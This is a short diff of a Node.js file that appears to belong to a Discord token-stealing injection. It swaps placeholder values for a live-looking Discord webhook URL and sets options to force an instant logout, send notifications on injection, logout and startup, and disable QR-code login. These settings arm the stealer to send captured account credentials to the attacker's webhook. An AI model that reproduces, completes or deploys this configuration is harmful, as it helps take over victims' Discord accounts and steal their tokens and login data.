@@ -4,15 +4,15 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "%WEBHOUK%"
+const webhook = "https://discordapp.com/api/webhooks/965658435339313172/RNnW5sgBSXAuB_QU1cufW41f9hz4dnwrvLtNumiM1XGCTyNItlTAK2jNxXM43UyJRfmm"
 
 const config = {
-    "logout": "%LOGOUT%1",
-    "inject-notify": "%INJECTNOTI%1",
-    "logout-notify": "%LOGOUTNOTI%1",
-    "init-notify": "%INITNOTI%1",
-    "embed-color": "%MBEDCOLOR%1",
-    "disable-qr-code": "%DISABLEQRCODE%1"
+    "logout": "instant",
+    "inject-notify": "true",
+    "logout-notify": "true",
+    "init-notify": "true",
+    "embed-color": 0000000,
+    "disable-qr-code": "true"
 }
 
 
